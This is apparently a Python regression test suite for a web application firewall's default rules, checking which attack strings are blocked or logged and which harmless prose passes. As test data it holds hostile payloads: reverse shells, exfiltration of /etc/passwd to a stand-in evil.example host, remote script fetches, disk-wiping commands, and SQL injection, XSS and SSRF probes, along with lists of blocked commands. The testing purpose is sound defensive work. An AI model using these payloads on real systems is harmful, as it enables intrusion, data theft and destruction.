#!/usr/bin/env python3
"""
VeryNginx v2 - factory WAF rules battery (v17+)
================================================
Behavioral + structural checks against verynginx/configs/waf-rules.default.json.

Why Python: the busted rig stubs ngx.re with *Lua patterns*
(test/v2/spec/spec_helper.lua), so the real PCRE dialect the engine runs in
nginx cannot be executed inside busted. This script re-runs the shipped
patterns under Python `re` (case-insensitive, mirroring the engine's "i"
compile flag in matcher/compare.lua) against a positive/negative case table.
New PCRE constructs are additionally validated against real PCRE before
landing (see /tmp scratch harness convention); the battery pins the
resulting behavior.

KNOWN DIVERGENCE (Python re vs PCRE-byte, affects RCE pins only): Python
treats CJK as \\w (no \\b between a command word and a directly-abutting
CJK char), while PCRE in byte mode treats CJK bytes as non-word (\\b
holds). Cases where CJK directly abuts a command word with no space
("; ssh进去看看", ";id中") are verified against real PCRE instead and are
NOT pinned here; spaced/CJK-after-space shapes behave identically on both
engines and are pinned normally.

Coverage contract (learned the hard way — the v14 rce_0007 review):
  1. Every regex-valued condition in the factory matcher tree compiles.
  2. FP tables MUST exercise every command family in a rule, not just the
     first alternation branch: the v14 release cut only probed the named
     command branch, and the bare-command branch (ls/pwd/id/...) shipped
     block-fast with zero prose coverage — 9/9 prose FPs slipped through.
     Section "per-command FP sweep" generates a prose case for EVERY
     command in the rce command lists and requires both patterns clear.
  3. Review cases are pinned by literal string so a future edit that
     re-breaks them fails loudly (see "review regression pins").
  4. rce_0007/vn_rce_0025 two-tier design: high-risk non-English commands
     block regardless of arguments; everything else logs only with a
     path/flag/URL/sensitive-word argument guard. Accepted misses
     ("; ps aux", "; make install", "; cat passwd without slash is now
     caught by marker word") are asserted as misses, not ignored.
  5. P0 review-round fixes (v16: sqli union/select-shape bypasses,
     tautology comment/LIKE gaps, sleep-prefix/info_schema prose FPs,
     xss event/verb-table gaps, ssrf userinfo bypass) each carry their own
     hit + clear pins below; accepted residuals are asserted, not ignored.
  6. v17 RCE rebuild (byte-suppressor bypass + data-URI/CSV FPs): the block
     tier is value-anchored (^SEP) with NO byte-content guard — any negative
     condition on attacker-controlled bytes is a bypass switch, so the
     suppressor is banned by structural assertion, not just by cases. The
     log tier merges the full command list for mid-value recall. Value-start
     SEP + block-cmd is injection-shaped BY DESIGN (even with CJK args);
     the realistic mid-value CJK prose stays clear and is pinned as such.

Run (repo root):  python3 test/v2/factory_rules_battery.py
Exit code 0 = all pass. CI/gate: run alongside busted + luacheck.
"""

import json
import os
import re
import sys

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
FACTORY = os.path.join(ROOT, "verynginx", "configs", "waf-rules.default.json")

NEW_EX = r"(?i)^/(?:phpmyadmin|phpminiadmin|adminer)(?:\.php)?(?:/|$)"

# Expected command lists (kept here on purpose: a factory edit that silently
# drops a command from a tier must fail the battery, not pass unnoticed).
BLOCK_CMDS = [
    "rm", "cp", "mv", "chmod", "chown", "dd", "mkfs", "ssh", "scp", "nc", "ncat",
    "netcat", "socat", "tftp", "telnet", "ftp", "mount", "umount", "crontab",
    "nohup", "pkill", "base64", "openssl",
]
NAMED_CMDS = [
    "cmd", "powershell", "bash", "sh", "zsh", "python[0-9.]*", "perl", "ruby", "php[0-9.]*",
    "node", "lua", "gcc", "make", "eval", "exec", "system", "wget", "curl", "cat",
    "head", "tail", "touch", "env", "printenv", "ps", "df", "kill", "ping", "dig",
    "nslookup", "whois", "traceroute", "netstat", "ifconfig", "route",
]
BARE6 = ["ls", "id", "whoami", "uname", "hostname", "pwd"]

FAILURES = []


def check(cond, label):
    if cond:
        print(f"  [PASS] {label}")
    else:
        print(f"  [FAIL] {label}")
        FAILURES.append(label)


def args_pattern(rule):
    def walk(o):
        if isinstance(o, dict):
            if isinstance(o.get("Args"), dict) and "value" in o["Args"]:
                return o["Args"]["value"]
            for v in o.values():
                f = walk(v)
                if f:
                    return f
        elif isinstance(o, list):
            for v in o:
                f = walk(v)
                if f:
                    return f
        return None
    return walk(rule.get("matcher") or {})


def regex_values(matcher):
    """Every operator-≈ string value in the matcher tree."""
    out = []

    def walk(o):
        if isinstance(o, dict):
            if o.get("operator") in ("≈", "!≈") and isinstance(o.get("value"), str):
                out.append(o["value"])
            for v in o.values():
                walk(v)
        elif isinstance(o, list):
            for v in o:
                walk(v)
    walk(matcher)
    return out


def main():
    with open(FACTORY, encoding="utf-8") as f:
        d = json.load(f)
    by = {r["id"]: r for r in d["rules"]}
    r7 = by["vn_rce_0007"]
    r25 = by["vn_rce_0025"]

    # ---- 1. compile-all -------------------------------------------------
    print("== compile: every ≈ regex under re.I ==")
    n = 0
    bad = []
    for r in d["rules"]:
        for pat in regex_values(r.get("matcher") or {}):
            n += 1
            try:
                re.compile(pat, re.I)
            except re.error as e:
                bad.append(f"{r['id']}: {e}")
    check(not bad, f"{n} regexes compile ({'; '.join(bad) if bad else 'ok'})")

    # ---- 2. two-tier rce pair: structure --------------------------------
    print("== rce pair structure ==")
    bp, lp = args_pattern(r7), args_pattern(r25)
    check(r7["action"] == "block" and r7["priority"] == 10,
          "vn_rce_0007 block @pri10")
    check(r25["action"] == "log" and r25["priority"] == 40,
          "vn_rce_0025 log @pri40")
    check(r7["version"] >= 6 and r25["version"] >= 1, "rule versions bumped")
    check("vn_rce_0025" in r7["description"], "rce_0007 description names the companion")
    missing_block = [c for c in BLOCK_CMDS if c not in bp]
    missing_named = [c for c in NAMED_CMDS if c not in lp]
    missing_bare = [c for c in BARE6 if c not in lp]
    check(not missing_block, f"block list present in rce_0007 ({missing_block or 'ok'})")
    check(not missing_named, f"named list present in vn_rce_0025 ({missing_named or 'ok'})")
    check(not missing_bare, f"bare-six present in vn_rce_0025 ({missing_bare or 'ok'})")
    # v17 structural pins for the byte-suppressor incident: the block tier
    # must be value-anchored, NEITHER rce pattern may contain a negative
    # byte-content guard (append-one-byte bypass), and the log tier must
    # carry the merged command list for mid-value recall.
    check(bp.startswith("^"), "vn_rce_0007 block pattern is value-anchored (^)")
    check("(?!(?:[\\s\\S]){0,50}" not in bp and "(?!(?:[\\s\\S]){0,50}" not in lp,
          "no byte-content suppressor in either rce pattern")
    missing_merged = [c for c in BLOCK_CMDS if c not in lp]
    check(not missing_merged,
          f"log tier merges block commands ({missing_merged or 'ok'})")
    for rid, pat in (("vn_rce_0007", bp), ("vn_rce_0025", lp)):
        uris = regex_values(by[rid]["matcher"])
        check(NEW_EX in uris, f"{rid} keeps the admin-path exemption")
    check(d.get("version") == 17, f"file version == 17 (got {d.get('version')})")
    check(len(d["rules"]) == 26, f"26 rules (got {len(d['rules'])})")
    check(by["vn_rce_0007"]["version"] >= 7, "vn_rce_0007 v7 (anchored, suppressor gone)")
    check(by["vn_rce_0025"]["version"] >= 2, "vn_rce_0025 v2 (merged command list)")
    check(by["vn_sqli_0001"]["version"] >= 7, "vn_sqli_0001 v7 (union-shape bypasses closed)")
    check(by["vn_sqli_0002"]["version"] >= 6, "vn_sqli_0002 v6 (comment/LIKE gaps closed)")
    check(by["vn_sqli_0004"]["version"] >= 6, "vn_sqli_0004 v6 (sleep-prefix/info_schema prose fixed)")
    check(by["vn_xss_0005"]["version"] >= 5, "vn_xss_0005 v5 (event families added)")
    check(by["vn_xss_0006"]["version"] >= 7, "vn_xss_0006 v7 (verb-table redesign)")
    check(by["vn_ssrf_0021"]["version"] >= 4, "vn_ssrf_0021 v4 (userinfo bypass closed)")

    bx = re.compile(bp, re.I)
    lg = re.compile(lp, re.I)

    def tier(v):
        if bx.search(v):
            return "block"
        if lg.search(v):
            return "log"
        return None

    # ---- 3. per-command FP sweep (the v14 incident regression) ----------
    # Every command in every tier gets prose cases. Value-start SEP +
    # block-cmd is injection-shaped BY DESIGN since v17 (even with CJK
    # args — the realistic CJK prose is mid-value and stays clear, pinned
    # below); everything else must clear both patterns.
    print("== per-command FP sweep (english filler + CJK) ==")
    sweep_fail = []
    sweep_total = 0
    block_set = set(BLOCK_CMDS)
    for cmd in BLOCK_CMDS + NAMED_CMDS + BARE6:
        plain = cmd.replace("[0-9.]*", "")
        if plain in block_set:
            cases = [(f"; {plain} is a test", None),
                     (f"; {plain} that file", None),
                     (f"wait; {plain} the docs", None),
                     (f"然后; {plain} 看看", None),
                     (f"上传后; {plain} 777 runtime目录就好了", None),
                     (f"备注; {plain} 看看", None),
                     # value-start CJK + block-cmd: injection-shaped, must HIT.
                     (f"; {plain} 777 目录", "block")]
        else:
            cases = [(f"; {plain} is a test", None),
                     (f"; {plain} 的中文说明", None),
                     (f"wait; {plain} the docs", None),
                     (f"然后; {plain} 看看", None)]
        for prose, want in cases:
            sweep_total += 1
            got = tier(prose)
            if got != want:
                sweep_fail.append(f"{prose!r} want {want} got {got}")
    check(not sweep_fail,
          f"{sweep_total} prose cases as designed "
          f"({'; '.join(sweep_fail[:3]) if sweep_fail else 'ok'})")

    # ---- 4. review regression pins (exact strings from the v15 review) --
    print("== review regression pins ==")
    review_fps = [
        "; ls the results",
        "然后; ls 看看有哪些文件",
        "run this; pwd the file first",
        "I said; id like to know more",
        "; whoami is the shell builtin",
        "; uname the kernel version",
        "; hostname of the box",
        "; pwd is the working dir",
        "; whoami like the manual says",
    ]
    for s in review_fps:
        check(tier(s) is None, f"FP clear: {s!r}")

    review_attacks = [
        ("; chmod 777 /tmp/x", "block"), ("; ssh user@host", "block"),
        ("; scp file host:/tmp", "block"), ("; cp a b", "block"),
        ("; mv a b", "block"), ("; chown root x", "block"),
        ("; nc 10.0.0.1 4444", "block"), ("; openssl enc -in a", "block"),
        ("; socat tcp:10.0.0.1:4444 -", "block"), ("; rm file", "block"),
        ("; cat passwd", "log"),
        # accepted misses by design — command + bare-English-word has no
        # distinguishing shape from prose; recall value below FP cost.
        ("; ps aux", None), ("; nslookup target", None),
        ("; make install", None), ("; mkdir /tmp/x", None),  # mkdir: pre-existing gap
    ]
    for s, want in review_attacks:
        check(tier(s) == want, f"attack {want or 'MISS(accepted)'}: {s!r}")

    # ---- 5. tier attack tables ------------------------------------------
    print("== block-tier attacks (must be 'block') ==")
    block_attacks = [
        "; rm -rf /", "; cp shell.php /var/www/html/", "; chmod u+s /bin/bash",
        "; chown www.www /x", "; dd if=/dev/zero of=/dev/sda", "; mkfs.ext4 /dev/sdb1",
        "; ssh -i ~/.ssh/id_rsa user@10.0.0.1", "; nc -lvp 4444",
        "; ncat -e /bin/sh 10.0.0.1 4444", "; netcat 10.0.0.1 4444",
        "; tftp 10.0.0.1 get /etc/passwd", "; telnet 10.0.0.1 23",
        "; ftp 10.0.0.1", "; mount -t nfs 10.0.0.1:/x /mnt", "; umount /var/www",
        "; crontab -e", "; nohup ./x.sh &", "; pkill -f nginx", "; base64 /etc/shadow",
        "| ssh root@1.2.3.4", "$(rm -rf /)", ";chown www.www /x",
        "; mount the share",  # NO — prose, see FP table; placeholder removed below
    ]
    block_attacks = [s for s in block_attacks if s != "; mount the share"]
    for s in block_attacks:
        check(tier(s) == "block", f"block hits: {s!r}")

    print("== log-tier attacks (must be 'log', never 'block') ==")
    log_attacks = [
        "; cat /etc/passwd", "; head -5 /etc/shadow", "; tail /var/log/auth.log",
        "; curl http://evil.example/x.sh", "; wget http://evil.example/payload",
        "; wget --post-file=/etc/passwd http://evil.example/",
        "x=$(curl evil.com/x.sh)", "; php -r system('id');", "; php8 -r 'id';",
        "; bash /tmp/x.sh", "; sh -c 'uname -a'", "; zsh /tmp/x",
        "; python3 -m http.server 8000", "; python -c 'import os;os.id()'",
        ";cat</etc/passwd", ";cat$IFS/etc/passwd", "; env PATH=/tmp",
        "; printenv SECRET_KEY", "; kill -9 1234", "; ping -c 4 10.0.0.1",
        "; dig @10.0.0.1 evil.example", "; nslookup evil.example.com",
        "; whois evil.example", "; traceroute 10.0.0.1", "; netstat -lntp",
        "; ifconfig eth0", "; route -n", "; node -e 'require(\"child_process\").exec(\"id\")'",
        "; lua os.execute('id')", "; gcc /tmp/x.c -o /tmp/x", "; make -C /tmp install",
        "; eval('id')", "; system('id')", "; exec /bin/sh", "; touch /tmp/shell.php",
        "; perl -e 'system \"id\"'", "; ruby -e 'exec \"id\"'",
        ";id", "; whoami", "; ls -la /var/www", "; pwd", "; uname -a",
        "; hostname -I", "`id`", "$(whoami)", "${ls}", "1;id", ";id;",
    ]
    for s in log_attacks:
        got = tier(s)
        check(got == "log", f"log hits (got {got}): {s!r}")

    # ---- 6. prose battery (beyond the per-command sweep) ----------------
    print("== curated prose battery ==")
    prose_fps = [
        "; cat is a pet", "wait; curl the docs", "ok; php 8.3",
        "他说：; cat 是宠物", "resume; head shoulders", "note; rm that file",
        "wait; curl me later", "alice;id=5", "; cat", "; touch base",
        "装完面板; ssh 端口改掉", "上传后; chmod 777 runtime目录就好了",
        "先; ls 看目录结构", "跑一下; curl测个速就出来", "用; cat 读文件内容",
        "; mount the share", "; telnet the router", "; dd the disk",
        "; nc so what", "test; env is loaded",
        "; df the disk usage", "; make sure to install", "; ps the process list",
        # v17 INTENTIONAL FLIPS (were clear under the v15 byte-suppressor,
        # which turned out to be a universal bypass switch): value-start SEP
        # + block-cmd is injection-shaped even with CJK args. Pinned as HIT:
        # "; chmod 777 目录" hits block on both engines (spaced, \\b holds).
        # "; ssh 进去看看" (spaced twin) hits block on both engines; the
        # unspaced twin "; ssh进去看看" also hits block on the engine but is
        # unpinnable in this Python rig (\\b divergence, see header).
        # "; base64 编码" / "; openssl 生成证书": same flip class.
        # The realistic mid-value twins ("上传后; chmod ...", "装完面板; ssh ...")
        # stay clear and are pinned above.
        # "; chmod 777 目录" / "; ssh 进去看看" live here as documentation of
        # the old suppressor-era strings; their spaced forms are asserted below.
    ]
    for s in prose_fps:
        got = tier(s)
        check(got is None, f"prose clear (got {got}): {s!r}")

    # ---- 6b. v17 RCE rebuild pins -------------------------------------
    # Byte-suppressor bypass closed: trailing high bytes must NOT clear.
    print("== v17 bypass-closed pins ==")
    for p, want in [("; rm -rf /", "block"), ("; ssh user@host", "block"),
                    ("; cp shell.php /var/www/html/x", "block"),
                    ("; mkfs.ext4 /dev/sda", "block"),
                    ("; crontab -e", "block"),
                    ("; nc -e /bin/sh 10.0.0.1 4444", "block"),
                    ("; socat tcp:10.0.0.1:4444 exec:bash", "block"),
                    ("; cat /etc/passwd", "log"),
                    ("; wget http://evil.example/x.sh", "log")]:
        check(tier(p) == want, f"attack {want}: {p!r}")
        for suffix in (" ", "€"):
            check(tier(p + suffix) == want, f"attack+byte {want}: {(p + suffix)!r}")
            check(tier(p + " " + suffix) == want, f"attack+space+byte {want}: {(p + ' ' + suffix)!r}")
        check(tier(p + " 备注") == want, f"attack+CJK-comment {want}: {(p + ' 备注')!r}")
    for suffix in (" ", "€"):
        check(tier(";id" + suffix) == "log", f"bare-id+byte logs: {';id' + suffix!r}")
    check(tier(";id 备注") is None, "bare-id + CJK words stays clear (like '; ls 看看')")
    # Value-start SEP + block-cmd flips (v15 suppressor hid these).
    check(tier("; chmod 777 目录") == "block", "flip: value-start chmod+CJK blocks")
    check(tier("; ssh 进去看看") == "block", "flip: value-start ssh+CJK blocks")
    check(tier("; base64 编码") == "block", "flip: value-start base64+CJK blocks")
    check(tier("; openssl 生成证书") == "block", "flip: value-start openssl+CJK blocks")
    # Mid-value injections keep their tier through the merged log list.
    for s in ["go; ssh user@host", "go; rm -rf /tmp/x", "x; chmod 777 /tmp/x",
              "pre; cat /etc/passwd post", "注; rm -rf /"]:
        check(tier(s) == "log", f"mid-value logs: {s!r}")
    # data-URI / CSV shapes: never block. png/svg clear both tiers; jpeg
    # carries '/' in the base64 alphabet and may log (accepted noise).
    print("== v17 data-URI / CSV pins ==")
    for s in ["src=data:image/png;base64,iVBORw0KGgo=",
              "src=data:image/svg+xml;base64,PHN2Zy8+",
              "a;rm,b", "a;mount,b", "a;ssh,b", "disk;mount,size",
              '{"note":"a;rm,b"}']:
        check(tier(s) is None, f"data/CSV clear: {s!r}")
    check(tier("src=data:image/jpeg;base64,/9j/4AAQSkZJRg==") == "log",
          "jpeg data-URI may log (accepted noise), never blocks")

    # ---- 8. P0 review-round fixes (v16) ----------------------------------
    # Each P0 finding carries hit + clear pins. Accepted residuals are
    # asserted (not silently dropped) with the reason inline.
    print("== P0 review-round fixes (v16) ==")

    def uri_attack_pattern(rule):
        """First URI ≈ value that is NOT the phpMyAdmin exemption."""
        found = []

        def walk(o):
            if isinstance(o, dict):
                if (isinstance(o.get("URI"), dict)
                        and o["URI"].get("operator") == "≈"
                        and isinstance(o["URI"].get("value"), str)
                        and "phpmyadmin" not in o["URI"]["value"].lower()):
                    found.append(o["URI"]["value"])
                for v in o.values():
                    walk(v)
            elif isinstance(o, list):
                for v in o:
                    walk(v)
        walk(rule.get("matcher") or {})
        return found[0] if found else None

    def pin(regex, cases, rid):
        for s, want in cases:
            got = bool(regex.search(s))
            check(got == want, f"[{rid}] {'hit' if want else 'clear'}: {s!r}")

    pin(re.compile(args_pattern(by["vn_sqli_0001"]), re.I), [
        ("id=1 UNION SELECT *", True),
        ("1 UNION(SELECT password FROM users)", True),
        ("1 UNION DISTINCT SELECT * FROM users", True),
        ("id=1 union select name from t", True),
        ("1' UNION SELECT password FROM users --", True),
        ("1 UNION ALL SELECT 1,2,3", True),
        ("1 union select null,null from t", True),
        ("our union select committee from each shop", False),
        ("the credit union select rates from the table daily", False),
        ("The UNION SELECT statement retrieves rows from a table", False),
        # Accepted residual: bare leading-digit marker + plain words, no
        # param-name '=' nearby. Real traffic carries 'name=' before the
        # value (covered by the backward-marker branch); sqlmap probes use
        # NULL (covered by the strong branch).
        ("1 union select name from t", False),
    ], "vn_sqli_0001")

    pin(re.compile(args_pattern(by["vn_sqli_0002"]), re.I), [
        ("1' OR 1=1", True),
        ("1' OR/**/1=1-- ", True),
        ("'/**/OR/**/1=1-- ", True),
        ("' OR 'a' LIKE 'a", True),
        ("1 OR 1 LIKE 1", True),
        ("1 OR 1 IN (1,2)", True),
        ("1 OR 1 BETWEEN 1 AND 2", True),
        ("1 OR 2=2", True),
        ("x' || '1'='1", True),
        ("' OR 'a'='a", True),
        ("cats or dogs, 1<2", False),
        ("do you like tea or coffee", False),
        # Known FP (P1, block): "bake 30 min or 1<2 hours" still hits.
        # Pinned in prose, not asserted, pending a value-shape guard.
    ], "vn_sqli_0002")

    pin(re.compile(args_pattern(by["vn_sqli_0004"]), re.I), [
        ("1' AND SLEEP(5)--+", True),
        ("x=(SLEEP(5))", True),
        ("1 AND BENCHMARK(1000000,MD5(1))", True),
        ("1' AND GET_LOCK('x',5)--", True),
        ("1 UNION SELECT * FROM information_schema.tables", True),
        ("1 AND UPDATEXML(1,2,3)--", True),
        ("' AND CHAR(105,110)--", True),
        ("1 UNION SELECT UNHEX(41)--", True),
        ("1 AND CONCAT('a','b')--", True),
        ("' WAITFOR DELAY '0:0:5'--", True),
        ("EXEC xp_cmdshell 'dir'", True),
        ("1;EXEC xp_cmdshell('dir')", True),
        ("1 AND SLEEP(5) FROM users", True),
        ('he said "sleep(8)" every night', False),
        ("where to sleep(nearby) on road trips", False),
        ("query information_schema.tables for columns", False),
        ("I need sleep(8 hours) daily", False),
        ("use waitfor delay to pause", False),
        ("enable xp_cmdshell on the server", False),
        ("the information_schema database stores metadata", False),
        ("error 0x80004005 on boot", False),
        ("call updatexml( to modify xml", False),
    ], "vn_sqli_0004")

    pin(re.compile(args_pattern(by["vn_xss_0005"]), re.I), [
        ("<svg onload=alert(1)>", True),
        ("<img src=x onerror=alert(1)>", True),
        ("<svg><animate onbegin=alert(1)>", True),
        ("<details open ontoggle=alert(1)>", True),
        ("<body onpointerenter=alert(1)>", True),
        ("<div onanimationend=alert(1)>", True),
        ('<div onclick/**/="x">', True),
        ("<svg/onload=alert(1)>", True),
        ("<form onformdata=alert(1)>", True),
        ("discussion of the onload attribute here", False),
        # Known FP (P1, block; gray-logged on prod): bare prose 'onclick='.
        # Asserted as HIT so a silent behavior change fails loudly; fix
        # requires an attribute-breakout-safe context guard, not a '<' prefix.
        ('discussion of "onclick=" attribute here', True),
    ], "vn_xss_0005")

    xss6_args = args_pattern(by["vn_xss_0006"])
    xss6_uri = uri_attack_pattern(by["vn_xss_0006"])
    check(xss6_uri == xss6_args, "vn_xss_0006 URI and Args branches share one value")
    pin(re.compile(xss6_args, re.I), [
        ("javascript:alert(1)", True),
        ("JaVaScRiPt:alert(1)", True),
        ('javascript:Function("alert(1)")()', True),
        ("javascript:setTimeout(alert(1))", True),
        ("javascript:fetch(1)", True),
        ("javascript:import(1)", True),
        ("javascript:top['al'+'ert'](1)", True),
        ("javascript:void(0)", True),
        ("javascript:eval(name)", True),
        ("java\tScript:alert(1)", True),
        ("data:text/html,<script>alert(1)</script>", True),
        ("data:text/html;base64,PHNjcmlwdA==", True),
        ("please javascript:confirm your email address", False),
        ("javascript:visit our site (link)", False),
        ("see the javascript: URL scheme", False),
        # Accepted residuals: vbscript: (IE-dead) and HTML-entity-encoded
        # schemes (no entity decoding on the match path).
        ("vbscript:msgbox(1)", False),
    ], "vn_xss_0006")
    if xss6_uri:
        pin(re.compile(xss6_uri, re.I), [
            ("javascript:alert(1)", True),
            ("please javascript:confirm your email address", False),
        ], "vn_xss_0006/uri")

    pin(re.compile(args_pattern(by["vn_ssrf_0021"]), re.I), [
        ("http://169.254.169.254/latest/meta-data/", True),
        ("http://evil@169.254.169.254/", True),
        ("http://evil@10.0.0.1:8080/", True),
        ("http://user:pass@192.168.1.1/", True),
        ("http://evil@2130706433/", True),
        ("http://evil@0x7f000001/", True),
        ("http://user@example.com/", False),
        ("https://oauth.example.com/callback", False),
    ], "vn_ssrf_0021")

    # ---- 7. other invariants (v14 sections retained) --------------------
    print("== v14 invariants retained ==")
    ex_vals = []
    for r in d["rules"]:
        for v in regex_values(r.get("matcher") or {}):
            if "phpmyadmin" in v.lower():
                ex_vals.append((r["id"], v))
    check(len(ex_vals) == 15 and all(v == NEW_EX for _, v in ex_vals),
          f"15 exemption sites carry the .php-tolerant pattern "
          f"(14 v14 rules + vn_rce_0025; got {len(ex_vals)})")
    ex = re.compile(NEW_EX, re.I)
    for uri in ["/phpMyAdmin/", "/adminer.php", "/phpminiadmin.php", "/adminer.php/server"]:
        check(bool(ex.match(uri)), f"exempt: {uri}")
    for uri in ["/mysql/phpmyadmin/", "/tools/adminer.php", "/adminerEvil", "/adminer.phpx"]:
        check(not ex.match(uri), f"NOT exempt: {uri}")
    check(by["vn_spam_0019"]["action"] == "log"
          and by["vn_spam_0019"]["description"].startswith("Logs requests"),
          "vn_spam_0019 log + wording fixed")

    print("== regression spot checks ==")
    sqli1 = re.compile(args_pattern(by["vn_sqli_0001"]), re.I)
    check(bool(sqli1.search("id=1 union select password from users")), "vn_sqli_0001 union hits")
    check(not sqli1.search("the union of select members"), "vn_sqli_0001 english phrase clear")
    lfi11 = re.compile(args_pattern(by["vn_lfi_0011"]), re.I)
    check(bool(lfi11.search("php://input")), "vn_lfi_0011 php://input hits")
    check(not lfi11.search("file://intranet-link"), "vn_lfi_0011 v12 FP case clear")

    print()
    if FAILURES:
        print(f"FAILED: {len(FAILURES)} check(s)")
        for f_ in FAILURES:
            print("  -", f_)
        return 1
    print("ALL PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
